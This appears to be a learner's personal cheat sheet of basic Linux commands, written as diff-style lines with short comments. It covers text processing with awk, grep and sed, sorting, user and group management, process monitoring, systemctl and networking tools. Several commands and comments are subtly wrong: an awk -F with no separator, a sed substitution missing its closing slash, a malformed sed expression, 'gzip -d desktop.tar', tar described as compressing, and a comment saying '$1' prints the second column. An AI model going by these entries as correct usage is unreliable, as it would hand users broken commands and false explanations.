+awk '{print $1}' permissiontext #lists second columns or field for all lines
+awk '{print $1,$2}' permissiontext #lists first and second columns or field for all lines
+awk '{print $NF}' permissiontext #list last columns or field all lines
+awk '/Jerry/ {print}' permissiontext #list columns or field which has characters 'Jerry'
+awk -F '{print $1}' /etc/passwd #list first COLON(:)
+cat permissiontext | awk '{$1="key"; print $0}' #Replace words(key) first field for all lines(not saving only replacing)
+awk 'length($0) > 15' permissiontext #shows lines which has more then 15 characters
+ls -l | awk '{if($NF == "permissiontext") print $0;}' #grapping line of the list which matches with "permissiontext"
+awk '{print NF}' permissiontext #show total of the columns for all lines
+-
+grep -i KeY permissiontext #shows KeY words no matter it has upper case or not
+grep -c key permissiontext #show how many "key" word in the file
+grep -n key permissiontext #shows all key words with line number
+grep -iv KeY permissiontext # shows everting in the file except which line has "KeY" letters
+grep -i key permissiontext | awk '{print $1}' #shows first column which lines has "key" letters for all line
+grep -i key permissiontext | awk '{print $1}' | cut -c1-3 #shows first three letter of the first column which lina has "key" word for all line
+ls -l | grep -i desktop #shows line of the lists which line has desktop word
+egrep -i "key|value" permissiontext #shows multiple word ones a time in the file
+egrep -i "key|value" | awk '{print $1}' #shows multiple word ones a time in the file whith first columns
+-
+sort permissiontext #shows everything in alphabetic order
+sort -r permissiontext #shows everyting reverse of the alphabetic order
+sort -k2 permissiontext #shows everything alphabetic order of the second column
+ls -l | sort --- ls -l | sort -r --- ls -l | sort -k9
+sort permissiontext | uniq #does not show duplicate of the line if there has one
+sort permissiontext | uniq -c #shows how many time duplicated for lines
+sort permissiontext | uniq -d #shows the lines which has the duplicate
+-
+wc permissiontext #shows number of the lines, words and bites(characters) in the file
+wc -l permissiontext # shows number of the lines in the files
+wc -w permissiontext #shows number of the words
+wc -c permissiontext #shows number of the bite(characters)
+ls -l | wc -l #shows number of the files
+ls -l | grep -i drw | wc -l #shows number of the directories
+grep key permissiontext | wc -l #show number of the "key" words
+      Compare Files (diff-cmp)
+diff permissiontext permissiontext2 #comparing two diffirent file and show what are the different (for line)
+cmp permissiontext permissiontext2 #comparing two diffirent file and show what are the different (for bite(characters)
+      Compress and un-Compress (tar-gzip-gzip -d or gunzip)
+tar cvf desktop.tar . #compressing files in the one container/file on the current
+tar xvf desktop.tar #un-compressing file
+gzip desktop.tar #makes smaller size for tar file
+gzip -d desktop.tar #brings back orginal size for file
+      Truncate File Size (truncate)
+truncate -s 40 permissiontext #that cuts your files size. if there was 50 bite memory when you decrease it 40 you will lose rest of your memory
+      Combine and Splitting Files (split)
+split -l 2 permissiontext #splits every two lines for one file. That makes your files size smaller and you can easly share your file.
+      vi Editor
+x #delete characters backwards while command mode(not insert mode)
+o #creates new line  while command mode(not insert mode)
+u #same undo
+shift+zz #saves and quick from vi editor
+/ #in the vi editor you can search word with forward slash "/" but make sure you are not in the insert mode.
+      sed Command s=substitute d=delete t-tab -i=like saving you made changes for file
+sed 's/Key/Value/g' permissiontext #replace Value word for Key word and only displaying that.not saving or changing
+sed -i 's/Key/Value' permissiontext #replace Value word for Key word and saving what changed on it.
+sed 's/Key//g' permissiontext #remove Key words in the file and display it.
+sed '/Key/d' permissiontext #remove lines which has Key word for temporary
+sed '/^$/d' permissiontext #remove empty lines in the file temporary
+sed '1,2d' permissiontext #remove first and second line in the file
+sed -i 's/\t/ /g' permissiontext #replace tab space to a single space
+sed -n 12,18p permissiontext #shows lines number 12 to 18 from file
+sed G permissiontext #addind an empty line between all lines
+sed '8!/Key/S/' permissiontext #replace Key to S letter expect line 8
+vi permissiontext in the file :%s/Key/Value #changes all Key words with Value in the vi editor
+      User Account Management (useradd-groupadd-userdel-groupdel-usermod) usermod=modify of user
+         note: all users records are in the /etc/passwd, /etc/group, /etc/shadow
+useradd spiderman #adding user
+userdel -r spiderman #deleting user (-r remove user from home directory)
+groupadd superheros #adding group
+groupdel superheros #deleting group
+usermod -G superheros spiderman #addind spiderman user to superheros group
+grep spiderman /etc/group #you can confirm that
+chgrp -R superheros spiderman #changes group spiderman to superheros
+useradd -g superheros -s /bin/bash -c "ironman is super hero" -m -d /home/ironman ironman #create new user and Adding superheros group
+passwd ironman #creating password for ironman user
+       The chage Command
+        note: The chage command changes the number of days between password changes and the date of
+       the last password change. This information is used by the system to determine when a
+       user must change his/her password.
+chage -m 5 -M 90 -W 10 -I 3 username
+      Switch User and Sudo Access (su -/sudo/visudo)
+   note: visudo is the file who has group and users list and what can do in linux
+      Monitor Users (who/last/w/finger/id)
+last | awk '{print $1}' | sort | uniq #shows who logged in the system
+w #show more information who is in the system( like wide command in K8S)
+      Talking to Users (users/wall/write)
+users #to see all users
+wall + enter + message + ctrl+d + enter #sends your message for all user in same system
+write username + enter #send message for specific user
+      System utility Commands (date/uptime/hostname/uname/which/cal/bc)
+which pwd #shows file of commands directions
+cal #calender
+bc #calculater
+      systemctl Command = make application up and running
+systemctl start/stop/status docker
+systemctl enable/disable docker
+systemctl restart/reload docker
+systemctl list-units --all #show all intalled programs
+      ps Command = command stands for process status and it displays all the currently running processes in the Linux
+ps # shows the processes of the current shell
+ps -e #shows all running processes
+ps aux #shows all running processes with widely information
+ps -ef | grep docker # shows all running processes in full format listing(most commonly used)
+ps -u username # shows all processes by users
+      top Command = is used to show the linux processes and it provides a real-time view of the runnin system
+top
+top -u username
+top + c #shows commands absolute path
+top + k #stop/kill process of the session
+top the shift+M+P #to sort all linux running processes by Memory usege
+      kill Command = is used to terminate processes manually
+kill PID(process id) # terminates process 
+      System Monitoring (top/df/iostat l/netstat/free|cat /proc/cpuinfo|cat /proc/meminfo)
+df #report file system disk space usage
+iostat #reports CPU statistics and input/output statistics for devices and partitions.
+netstat #Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships
+free #Display amount of free and used memory in the system
+      Log Monitoring (here are some logs= boot|chronyd = NTP|cron|maillog|secure|messages|httpd| /var/log)
+grep -i error messages #display all errors in the messages file 
+      Network Files and Commands (ping|ifconfig|ifup or ifdown|netstat|tcpdump)
+ping google.com
+ifconfig # show your ip addresses and network card
+ifup/ifdown #connecting insternet/disconneting intermet
+netstat -rnv #shows your Gateway
+tcpdump -i eth0 
+ethtool lo/eth0 #shows your internet card.use case troobleshooting local to server internet problem
+      Download Files or Application (wget)
+wget <linkForWhatYouWantToDownload>
+      curl and ping Commands = to checks connection
+curl -O <linkForWhatYouWantToDownload> # same for wget 
+curl www.google.com
+ping www.google.com
+      SCP - Secure Copy Protocol
+scp fileName hostnameAndIpAddress
+
+
+
+ifconfig #Check current ip address
+ip addr show #all details with ip address
+ip addr show eth0 #Just show ip4 addr
+
+df #diskfree Check free disk space 
+df -ah #all file system - human 
+du -sh foldername #Folder size
+netstat #check all the ports sockets
+netstat -tulpn #
+ps aux #Check CPU usage for process
+ps aux | grep nginx #Check CPU usage for process
+---checking-memory---
+top #see cpu and memory
+   yum install -y htop #installing htop 
+   htop # The information the htop command provides is similar to the top command
+free # Command to Display the Amount of Physical and Swap Memory
+
+
+nslookup google.com #Nslookup (stands for “Name Server Lookup”) is a useful command for getting information from the DNS server
+
+systemctl restart kubelet #restart kubelet
+systemctl start kubelet #restart kubelet
+
+systemctl status containerd
+
+service status nginx #check the nginx status
+
+init 6 and plus R #rebooting to server
